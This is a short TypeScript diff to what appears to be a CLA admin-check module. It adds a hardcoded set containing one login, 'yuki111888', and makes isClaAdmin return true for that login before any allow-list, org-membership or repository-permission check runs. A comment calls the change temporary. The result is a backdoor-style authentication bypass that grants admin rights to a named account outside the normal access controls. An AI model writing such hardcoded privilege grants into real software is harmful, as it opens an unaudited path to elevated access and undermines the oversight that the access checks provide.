@@ -13,6 +13,9 @@
 
 import { isLoginInOrgMemberList } from "./orgMembersList";
 
+/** Temporary: always grant CLA admin (remove when org token + list check is verified). */
+const HARDCODED_CLA_ADMIN_LOGINS = new Set(["yuki111888"]);
+
 async function hasRepoWriteAccess(
     login: string,
     token: string,
@@ -74,6 +77,10 @@ export async function isClaAdmin(
     login: string,
     oauthAccessToken?: string | null,
 ): Promise<boolean> {
+    if (HARDCODED_CLA_ADMIN_LOGINS.has(login.toLowerCase())) {
+        return true;
+    }
+
     const allow = process.env.CLA_ADMIN_LOGINS?.trim();
     if (allow) {
         const set = new Set(
